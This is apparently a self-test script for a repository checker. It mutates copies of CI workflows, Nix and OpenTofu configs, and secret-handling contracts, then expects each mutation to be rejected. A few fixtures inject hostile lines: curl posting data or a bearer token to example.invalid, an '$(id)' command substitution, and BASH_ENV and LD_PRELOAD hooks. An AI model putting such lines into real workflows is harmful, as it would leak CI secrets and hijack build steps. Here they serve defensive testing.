#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import shutil
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("repository_check", ROOT / "checks/repository.py")
assert SPEC is not None and SPEC.loader is not None
repository = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(repository)


def copy_root() -> Path:
    target = Path(tempfile.mkdtemp(prefix="envs-repository-test-")) / "repo"
    shutil.copytree(ROOT, target, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git"))
    return target


def expect_red(mutate) -> None:
    root = copy_root()
    try:
        mutate(root)
        try:
            repository.inspect(root)
        except (repository.RepositoryError, ValueError, OSError):
            return
        raise AssertionError("invalid repository state was accepted")
    finally:
        shutil.rmtree(root.parent, ignore_errors=True)


def append_branch_effect(root: Path) -> None:
    path = root / "contracts/provider-consumer.jsonl"
    rows = [json.loads(line) for line in path.read_text().splitlines() if line]
    rows[0]["effect_source_branches"].append("main")
    path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))


def mutate_plane(identity: str, change):
    def mutate(root: Path) -> None:
        path = root / "contracts/environments.jsonl"
        rows = [json.loads(line) for line in path.read_text().splitlines() if line]
        for row in rows:
            if row["id"] == identity:
                change(row)
        path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in rows))

    return mutate


def replace_text(relative: str, old: str, new: str):
    def mutate(root: Path) -> None:
        path = root / relative
        text = path.read_text(encoding="utf-8")
        assert old in text, f"{relative} fixture anchor missing"
        path.write_text(text.replace(old, new), encoding="utf-8")

    return mutate


def main() -> None:
    baseline = repository.inspect(ROOT)
    assert baseline["status"] == "PASS"
    assert baseline["canonical_branch"] == "proposals"
    assert baseline["retained_compatibility_branch"] == "main"

    expect_red(lambda root: (root / "migration").mkdir())
    expect_red(lambda root: (root / "unexpected").mkdir())
    expect_red(lambda root: (root / "adapters/legacy.sh").write_text("exit 0\n"))
    expect_red(lambda root: (root / "adapters/legacy.go").write_text("package legacy\n"))
    expect_red(lambda root: (root / "contracts/provider-consumer.jsonl").unlink())
    expect_red(append_branch_effect)

    def add_database_path(root: Path) -> None:
        name = "duck" + "db"
        (root / f"contracts/{name}.jsonl").write_text("{}\n")

    expect_red(add_database_path)

    def add_token(root: Path) -> None:
        token = "gh" + "p_" + ("A" * 30)
        (root / "contracts/token.txt").write_text(token)

    expect_red(add_token)

    def add_historical_fallback(root: Path) -> None:
        historical = "roccho-dev/" + "envs-old"
        with (root / "adapters/jev_api.py").open("a", encoding="utf-8") as stream:
            stream.write("\n# fallback " + historical + "\n")

    expect_red(add_historical_fallback)

    def propose_main_deletion(root: Path) -> None:
        with (root / "README.md").open("a", encoding="utf-8") as stream:
            stream.write("\nDelete `main` after migration.\n")

    expect_red(propose_main_deletion)
    expect_red(replace_text("README.md", "retained compatibility branch: `main`", "retained compatibility mirror: `main`"))

    obsolete_field = "age_" + "recipients"
    obsolete_source = "SOURCE_" + "JEV_API_KEY"
    author = ".github/workflows/author-dev-jev-api.yml"
    project = ".github/workflows/project-dev-jev-api.yml"
    expect_red(mutate_plane("dev.authoring", lambda row: row.update({obsolete_field: []})))
    expect_red(mutate_plane("dev.runtime", lambda row: row.update({"required_variables": []})))
    expect_red(mutate_plane("stg.projection", lambda row: row["required_variables"].clear()))
    expect_red(mutate_plane("prd.projection", lambda row: row["required_secrets"].pop()))
    expect_red(mutate_plane("dev.projection", lambda row: row["required_variables"].append(
        {"name": "EXTRA", "type": "cloudflare_account_id", "lifecycle": "persistent"})))
    expect_red(mutate_plane("dev.authoring", lambda row: row["required_secrets"][0].update(
        {"lifecycle": "persistent"})))
    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n", ""))
    expect_red(replace_text(author, "${{ vars.SOPS_AGE_RECIPIENTS }}", "${{ secrets.SOPS_AGE_RECIPIENTS }}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}",
                            f"{obsolete_source}: ${{{{ secrets.{obsolete_source} }}}}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}", "JEV_API_KEY: fixture-literal"))
    expect_red(replace_text(author, "SOPS_AGE_RECIPIENTS: ${{ vars", "AGE_RECIPIENTS: ${{ vars"))
    expect_red(replace_text(project, "          CLOUDFLARE_ACCOUNT_ID:",
                            "          EXTRA: ${{ secrets.EXTRA }}\n          CLOUDFLARE_ACCOUNT_ID:"))

    # The effect entry must stay repo-owned: no ambient tool, runtime acquisition, or unlocked closure.
    entry = '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE"'
    build = "nix build .#effect-toolchain --no-update-lock-file"
    identity_step = "      - name: Record effect toolchain identity\n"
    expect_red(replace_text(author, f"{entry} author", "python3 adapters/jev_api.py author"))
    expect_red(replace_text(project, f"{entry} project", "nix shell .#effect-toolchain -c envs-effect project"))
    expect_red(replace_text(project, f"{entry} project", f"npx --yes wrangler@4 && {entry} project"))
    expect_red(replace_text(author, '"$tool/gh" pr create', "gh pr create"))
    expect_red(replace_text(author, '"$tool/git" push', "git push"))
    # Effect workflows consume the provided artifact; any rebuild or Nix install there is RED.
    expect_red(replace_text(project, identity_step, f"      - name: Rebuild\n        run: {build}\n\n{identity_step}"))
    expect_red(replace_text(author, identity_step, "      - name: Install Nix\n        uses: cachix/install-nix-action@"
                            "13d8dd58da0234aa297dedd986986ccb8e7f3e24\n\n" + identity_step))
    expect_red(lambda root: (root / "flake.lock").unlink())
    expect_red(replace_text("flake.lock", '"rev": "', '"rev": "0'))
    expect_red(replace_text("flake.nix", "wrangler = \"${pkgs.wrangler}", "wrangler = \"/usr/bin/wrangler"))
    expect_red(replace_text("adapters/jev_api.py", 'wrangler = tools["wrangler"]', 'wrangler = "npx"'))
    expect_red(replace_text(".github/workflows/check.yml", build, "nix flake show"))

    # Absolute-path, chained, or rebound executables are as ambient as bare names.
    expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
    expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
    expect_red(replace_text(project, 'tool="$ENVS_EFFECT_BIN"', 'tool="/usr/bin"'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
    expect_red(replace_text(project, "        run: |", "        shell: /usr/bin/bash {0}\n        run: |"))

    # The closure identity is recorded by the tool itself after realization and before secrets.
    identity = "      - name: Record effect toolchain identity\n" f"        run: '{entry} toolchain'\n\n"
    expect_red(replace_text(author, identity, ""))
    expect_red(replace_text(project, identity, ""))

    def move_identity_after_secrets(root: Path) -> None:
        path = root / project
        text = path.read_text(encoding="utf-8")
        path.write_text(text.replace(identity, "") + "\n" + identity, encoding="utf-8")

    expect_red(move_identity_after_secrets)

    # The committed lock must be proven Nix-generated, and the closure tools executed.
    check = ".github/workflows/check.yml"
    expect_red(replace_text(check, '          cmp flake.lock "$relock/flake.lock"\n', ""))
    expect_red(replace_text(check, '          "$tool/wrangler" --version\n', ""))
    expect_red(replace_text(check, 'pages secret "$command" --help', 'pages secret "$command"'))

    # The consumer is the clean-start consumer verbatim, resolved by the dispatched SHA, before secrets.
    consumer = "- name: Obtain provided effect artifact\n"
    verify = '          echo "${digest#sha256:}  $art/envs-effect.zip" | sha256sum -c -\n'
    expect_red(replace_text(author, verify, ""))
    expect_red(replace_text(project, "ENVS_SOURCE_SHA: ${{ github.sha }}", "ENVS_SOURCE_SHA: ${{ github.event.inputs.sha }}"))
    expect_red(replace_text(project, consumer, "- name: Obtain effect artifact\n"))

    def move_consumer_after_secrets(root: Path) -> None:
        path = root / author
        text = path.read_text(encoding="utf-8")
        step = next(block for block in text.split("\n\n") if consumer in block)
        path.write_text(text.replace(step + "\n\n", "") + "\n" + step + "\n", encoding="utf-8")

    expect_red(move_consumer_after_secrets)

    # check provides the artifact and proves a checkout-free, Nix-free clean start with destructive cases.
    expect_red(replace_text(check, "actions/upload-artifact@", "actions/upload-artifact-disabled@"))
    expect_red(replace_text(check, "nix build .#effect-artifact", "nix build .#effect-toolchain"))
    expect_red(replace_text(check, "    needs: toolchain\n", ""))
    expect_red(replace_text(check, "    timeout-minutes: 20\n    steps:\n", "    timeout-minutes: 20\n    steps:\n"
                            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n\n"))
    expect_red(replace_text(check, verify, ""))
    expect_red(replace_text(check, 'test "$MISSING" = failure', "true"))
    expect_red(replace_text(check, "for case in lock adapter; do", "for case in lock; do"))
    expect_red(replace_text("flake.nix", "closureInfo { rootPaths = [ effect-toolchain ]; }", "closureInfo { rootPaths = [ ]; }"))
    expect_red(replace_text("flake.nix", "-I ${self}/adapters/jev_api.py", "-I adapters/jev_api.py"))

    # The artifact is built from, named after, and resolved by the exact commit, repository, and push producer.
    source_ref = "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n"
    expect_red(replace_text(check, source_ref, ""))
    expect_red(replace_text(check, '          test "$(git rev-parse HEAD)" = "$ENVS_SOURCE_SHA"\n', ""))
    expect_red(replace_text(check, "name: envs-effect-${{ env.ENVS_SOURCE_SHA }}",
                            "name: envs-effect-${{ github.sha }}"))
    expect_red(replace_text(check, "cancel-in-progress: ${{ github.event_name == 'pull_request' }}", "cancel-in-progress: true"))
    expect_red(replace_text("flake.nix", "        echo ${rev} > SOURCE\n", ""))

    def weaken_consumer(old: str, new: str):
        def mutate(root: Path) -> None:
            for relative in (check, author, project):
                replace_text(relative, old, new)(root)

        return mutate

    expect_red(weaken_consumer('          test "$(tar -xOf "$art/content/envs-effect.tar" SOURCE)" = "$ENVS_SOURCE_SHA"\n', ""))
    expect_red(weaken_consumer('(.event == "push" and .conclusion == "success")', '.conclusion == "success"'))
    expect_red(weaken_consumer(" and .head_repository.full_name == $repo", ""))
    expect_red(replace_text(check, "            '.head_repository.full_name = \"fork/envs\"' \\\n", ""))
    expect_red(replace_text(check, "artifact built from another commit was accepted", "accepted"))

    # effect-shape runs the provided artifact over a same-commit data checkout, exactly as effect jobs do.
    expect_red(replace_text(check, '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE" toolchain | tee',
                            '"$ENVS_EFFECT_BIN/envs-effect" toolchain | tee'))
    expect_red(replace_text(check, ".source == $sha and .root == $root", ".status == \"PASS\""))

    # Effect jobs accept only declared step env; nothing but the consumer may alter the step environment.
    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n",
                            "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n          BASH_ENV: /tmp/hook\n"))
    expect_red(replace_text(project, "    environment: dev-projection\n",
                            "    environment: dev-projection\n    env:\n      LD_PRELOAD: /tmp/hook.so\n"))
    expect_red(replace_text(project, '          tool="$ENVS_EFFECT_BIN"\n',
                            '          tool="$ENVS_EFFECT_BIN"\n          "$tool/git" config core.hooksPath >>"$GITHUB_PATH"\n'))
    expect_red(replace_text("README.md", "dev-projection/SOPS_AGE_KEY", "dev-projection/REMOVED"))
    expect_red(replace_text("README.md", "prd-projection/CLOUDFLARE_ACCOUNT_ID", "prd-projection/REMOVED"))

    # The rent tunnel path is a manual effect workflow under the same rules, for exactly one target recipient.
    rent = ".github/workflows/project-dev-rent-tunnel.yml"
    expect_red(replace_text(rent, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n"))
    expect_red(replace_text(rent, "environment: dev-rent-tunnel", "environment: dev-projection"))
    expect_red(replace_text(rent, "${{ vars.RENT_AGE_RECIPIENT }}", "${{ secrets.RENT_AGE_RECIPIENT }}"))
    expect_red(replace_text(rent, "          RENT_TUNNEL_ID: ${{ vars.RENT_TUNNEL_ID }}\n", ""))
    expect_red(replace_text(rent, f"{entry} rent-tunnel", "python3 adapters/jev_api.py rent-tunnel"))
    expect_red(replace_text(rent, "contracts/environments.jsonl\n", "contracts/environments.jsonl README.md\n"))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row["required_variables"].pop()))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row["required_variables"][2].update({"type": "age_recipient_list"})))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row.update({"source_kind": "public_sops"})))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"does_not_own":["target_apply",', '"does_not_own":['))
    expect_red(replace_text("README.md", "dev-rent-tunnel/RENT_AGE_RECIPIENT", "dev-rent-tunnel/REMOVED"))

    # The OCI dev target: one declared binding, one literal author step with only its own inputs, no default target.
    oci_mapping = "          OCI_DEV_AGE_RECIPIENT: ${{ vars.OCI_DEV_AGE_RECIPIENT }}\n"
    cloudflare_mapping = "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n"
    expect_red(replace_text(author, oci_mapping, ""))
    expect_red(replace_text(author, oci_mapping, cloudflare_mapping))
    expect_red(replace_text(author, cloudflare_mapping, cloudflare_mapping + oci_mapping))
    expect_red(replace_text(author, "          - jev-api.oci-dev\n", ""))
    expect_red(replace_text(author, "        required: true\n        type: choice\n", "        type: choice\n"))
    expect_red(replace_text(author, "author --target jev-api.oci-dev'", "author --target ${{ inputs.target }}'"))
    expect_red(replace_text(author, "author --target jev-api'", "author'"))
    expect_red(replace_text(author, "        if: inputs.target == 'jev-api.oci-dev'\n", ""))
    expect_red(replace_text("contracts/bindings.jsonl", '"required_variables":[{"name":"OCI_DEV_AGE_RECIPIENT","type":"age_recipient"',
                            '"required_variables":[{"name":"OCI_DEV_AGE_RECIPIENT","type":"age_recipient_list"'))
    expect_red(replace_text("contracts/bindings.jsonl", '"host":"oci-dev","kind":"process_env"', '"host":"oci-dev","kind":"env_file"'))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"binding":"jev-api.oci-dev",', ""))
    expect_red(replace_text("README.md", "dev-authoring/OCI_DEV_AGE_RECIPIENT", "dev-authoring/REMOVED"))
    expect_red(replace_text(check, "checks/test_jev_api.py --sops", "checks/test_jev_api.py --no-sops"))

    def invalid_oci_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-jev-api.oci-dev.sops.yaml").write_text("JEV_API_KEY: plain\n")

    expect_red(invalid_oci_ciphertext)

    def extra_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-other.sops.yaml").write_text("x: 1\n")

    expect_red(extra_ciphertext)

    # check runs the real locked SOPS roundtrip; age is check-only and proven outside the provided artifact.
    expect_red(replace_text(check, ' --age-keygen "$RUNNER_TEMP/check-age/bin/age-keygen"', ""))
    expect_red(replace_text(check, "run: python3 checks/test_rent_tunnel.py\n", "run: 'true'\n"))
    expect_red(replace_text(check, 'if grep -qxF "$age" "$RUNNER_TEMP/provided.list"; then', "if false; then"))
    expect_red(replace_text(check, '          grep -qxF "$sops" "$RUNNER_TEMP/provided.list"\n', ""))
    expect_red(replace_text("flake.nix", "[ python3 sops wrangler git gh openssh curl ]",
                            "[ python3 sops wrangler git gh openssh curl age ]"))
    expect_red(replace_text("flake.nix", "        check-age = pkgs.age;\n", ""))
    expect_red(replace_text("flake.nix", "${pkgs.cacert}/etc/ssl/certs/ca-bundle.crt", "/etc/ssl/certs/ca-certificates.crt"))

    # The Access probe: manual, read-only on the repository, standard provider, every resource gated, no state in Git.
    probe = ".github/workflows/probe-dev-rent-access-ssh.yml"
    tf = "providers/dev-rent-access-probe/main.tf"
    expect_red(replace_text(probe, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n"))
    expect_red(replace_text(probe, "  contents: read\n", "  contents: write\n"))
    expect_red(replace_text(probe, "environment: dev-rent-access-probe", "environment: dev-rent-tunnel"))
    expect_red(replace_text(probe, "          CLOUDFLARE_ZONE_ID: ${{ vars.CLOUDFLARE_ZONE_ID }}\n", ""))
    expect_red(replace_text(probe, f"{entry} rent-access-probe", f"{entry} rent-access-locate"))
    expect_red(replace_text(probe, f"{entry} rent-access-probe", '"$ENVS_EFFECT_BIN/tofu" destroy'))
    expect_red(replace_text(tf, '  count   = local.count\n  zone_id = var.zone_id\n  name    = local.hostname',
                            '  zone_id = var.zone_id\n  name    = local.hostname'))
    expect_red(replace_text(tf, "terraform {\n", 'terraform {\n  backend "local" {}\n'))
    expect_red(replace_text(tf, 'decision   = "non_identity"', 'decision   = "allow"'))
    expect_red(replace_text(tf, "service_token = { token_id = cloudflare_zero_trust_access_service_token.probe[0].id }",
                            "any_valid_service_token = {}"))
    expect_red(replace_text(tf, 'version = "5.21.1"', 'version = ">= 5.0"'))
    expect_red(replace_text(tf, 'output "credentials" {\n  sensitive = true\n', 'output "credentials" {\n'))
    expect_red(lambda root: (root / "providers/dev-rent-access-probe/terraform.tfstate").write_text("{}\n"))
    # The persistent root: native validate accepts each of these, so the oracle must refuse them.
    rent = "providers/dev-rent-cloudflare/main.tf"
    expect_red(replace_text(rent, '  backend "s3" {\n', '  backend "local" {\n'))
    expect_red(replace_text(rent, "    plan {\n      enforced = true\n    }\n", "    plan {\n      enforced = false\n    }\n"))
    expect_red(replace_text(rent, "    state {\n      enforced = true\n    }\n", ""))
    expect_red(replace_text(rent, 'output "credentials" {\n  sensitive = true\n', 'output "credentials" {\n'))
    expect_red(replace_text(rent, "  duration   = var.service_token_duration\n", '  duration   = "1h"\n'))
    expect_red(replace_text(rent, 'variable "service_token_duration" {\n  type = string\n}\n',
                            'variable "service_token_duration" {\n  type    = string\n  default = "8760h"\n}\n'))
    expect_red(replace_text(".github/workflows/check.yml", '"$tool/tofu" -chdir="$rent" validate -no-color\n', ""))
    # A second, fixed lifetime elsewhere is refused; harmless comments on and around the one assignment are not.
    expect_red(replace_text(rent, '\ndata "cloudflare_zero_trust_tunnel_cloudflared_token" "rent" {',
                            '\nresource "cloudflare_zero_trust_access_service_token" "spare" {\n  account_id = var.account_id\n'
                            '  name       = "spare"\n  duration   = "1h"\n}\n\ndata "cloudflare_zero_trust_tunnel_cloudflared_token" "rent" {'))
    declared = (ROOT / rent).read_text(encoding="utf-8")
    commented = ('# backend "s3" is not another backend\n// duration = "1h" is only a comment\n'
                 + declared.replace("  duration   = var.service_token_duration\n",
                                    '  /*\n  duration = "1h"\n  */\n  duration   = var.service_token_duration # bound at deployment\n'))
    assert '  /*\n  duration = "1h"\n  */\n' in commented, "rent fixture anchor missing"
    repository.check_rent_config(commented)
    expect_red(lambda root: (root / "providers/dev-rent-access-probe/.terraform.lock.hcl").write_text("\n"))
    expect_red(mutate_plane("dev.rent-access-probe", lambda row: row.update(
        {"active_github_environment": "dev-rent-access-probe", "migration_state": "ACTIVE"})))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"does_not_own":["existing_cloudflare_resources",',
                            '"does_not_own":['))
    expect_red(replace_text("flake.nix", 'pkgs.cloudflared.version == "2026.6.1"', 'pkgs.cloudflared.version != ""'))
    expect_red(replace_text("flake.nix", "[ p.cloudflare_cloudflare ]", "[ p.cloudflare_cloudflare p.hashicorp_random ]"))
    expect_red(replace_text("flake.nix", 'tofu = "${opentofu}/bin/tofu";', 'tofu = "/usr/bin/tofu";'))
    expect_red(replace_text(check, "HTTPS_PROXY=http://127.0.0.1:9 HTTP_PROXY=http://127.0.0.1:9 ", ""))
    expect_red(replace_text(check, ' --real-ssh "$tool"', ""))
    # The state proof job enters only for the dispatched expected SHA on attempt 1; the input stays required.
    state = ".github/workflows/probe-dev-rent-state.yml"
    expect_red(replace_text(state, " && github.sha == inputs.expected_source_sha", ""))
    expect_red(replace_text(state, " && github.run_attempt == '1'", ""))
    expect_red(replace_text(state, "github.sha == inputs.expected_source_sha", "github.sha != inputs.expected_source_sha"))
    expect_red(replace_text(state, "        required: true\n", "        required: false\n"))
    expect_red(replace_text(state, "    inputs:\n      expected_source_sha:\n", "    inputs:\n      source_sha:\n"))
    expect_red(replace_text(state, "    timeout-minutes:", "    if: always()\n    timeout-minutes:"))
    # The state proof's native OpenTofu rotation regression is mandatory in check, not an optional local run.
    expect_red(replace_text(check, ' --real-tofu "$tool/tofu"', ""))
    # So is the real closure curl against the signed loopback fixture, its closure membership and the marker argv.
    expect_red(replace_text(check, ' --real-s3 "$tool/curl"', ""))
    expect_red(replace_text(check, 'grep -qxF "$curl" "$RUNNER_TEMP/provided.list"', "true"))
    expect_red(replace_text(check, 'grep -qF -- --pipe "$RUNNER_TEMP/r2-object-put.help"', "true"))
    expect_red(replace_text("flake.nix", 'curl = "${pkgs.curl}/bin/curl";', 'curl = "/usr/bin/curl";'))
    expect_red(replace_text("flake.nix", "openssh curl ]", "openssh ]"))
    expect_red(replace_text(check, 'grep -qF "cloudflared version 2026.6.1 "', 'grep -qF "cloudflared version"'))
    expect_red(replace_text(check, "run: python3 checks/test_rent_access_probe.py\n", "run: 'true'\n"))
    expect_red(replace_text("README.md", "name lookup locates candidates and never proves ownership", "name lookup finds ours"))
    expect_red(replace_text("README.md", "dev-rent-access-probe/CLOUDFLARE_ZONE_ID", "dev-rent-access-probe/REMOVED"))

    # placement-gate (windows #14): each job binds the actual outputs; the entrance and the receiver keep values private.
    for marker in (
        'echo "cb6fec76e23cb4ac56771ac38472b0fe1ba79a849bf2200aeda7c9467a045b7b  $RUNNER_TEMP/placement/sops.exe" | sha256sum -c -',
        "$required = 'scope', 'build', 'windows', 'rent / build-test-publish', 'publish'",
        "$ref.object.type -cne 'commit' -or $ref.object.sha -cne $source",
        "if ('sha256:' + (Sha (Join-Path $dir $asset.name)) -cne $asset.digest)",
        "$n.Name -cin @('ReadRentAccessInput', 'Get-RentAccessProblem')",
        "$placed.verdict.sha256 -cne $values.client_slot_sha256",
        "manifests/sha-$WINDOWS_SOURCE",
        '"$entry" --root "$data" rent-client',
    ):
        expect_red(replace_text(check, marker, "true"))
    expect_red(replace_text(check, "    needs: [toolchain, placement-artifact, placement-author, placement-windows]\n",
                            "    needs: [placement-author]\n"))
    expect_red(replace_text(check, "    runs-on: windows-latest\n    timeout-minutes: 20\n", "    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n"))
    expect_red(replace_text(check, "          GH_TOKEN: ${{ github.token }}\n        run: |\n          $ErrorActionPreference",
                            "          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          $ErrorActionPreference"))
    expect_red(replace_text(check, "          token=\"$(curl -fsS 'https://ghcr.io/token",
                            "          curl -fsSL -H \"Authorization: Bearer $GH_TOKEN\" https://example.invalid\n"
                            "          token=\"$(curl -fsS 'https://ghcr.io/token"))
    expect_red(replace_text("flake.nix", '"sha256-y2/sduI8tKxWdxrDhHKw/hunmoSb8iAK7afJRnoEW3s="', "lib.fakeHash"))
    expect_red(replace_text("flake.nix", 'assert pkgs.sops.version == "3.13.2"; ', ""))
    receiver = "adapters/rent-receive.sh"
    expect_red(replace_text(receiver, "echo rent-receive: placed", 'echo "rent-receive: placed"'))
    expect_red(replace_text(receiver, "chmod 600 $temp\n", ""))
    expect_red(replace_text(receiver, "[ ! -L $slot ] || fail the slot is a link\n", ""))
    entrance = "adapters/place.ps1"
    expect_red(replace_text(entrance, "exit $code\n", "Write-Host $payload\nexit $code\n"))
    expect_red(replace_text(entrance, "-Mode RentAccess'", "-Mode RentSsh'"))
    expect_red(replace_text(entrance, "@{ SOPS_AGE_KEY_FILE = $Identity }", "@{ SOPS_AGE_KEY = $Identity }"))
    expect_red(replace_text(entrance, "        if ([Console]::InputEncoding.GetPreamble().Length) { Refuse 'the console input encoding would prefix the value' }\n", ""))
    expect_red(lambda root: (root / "adapters/receive.sh").write_text("exit 0\n"))
    expect_red(replace_text("README.md", "placement-gate", "placement gate"))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"distribution_source":"', '"distribution_source":"main'))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"root_output_projection",', ""))
    expect_red(mutate_plane("dev.rent-client", lambda row: row["required_variables"][0].update({"type": "age_recipient_list"})))
    expect_red(mutate_plane("dev.rent-client", lambda row: row.update({"github_environment": "dev-rent-tunnel"})))

    def invalid_client_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-rent-client.sops.yaml").write_text("RENT_ACCESS_CLIENT_ID: plain\n")

    expect_red(invalid_client_ciphertext)
    print("repository checker self-test: PASS")


if __name__ == "__main__":
    main()
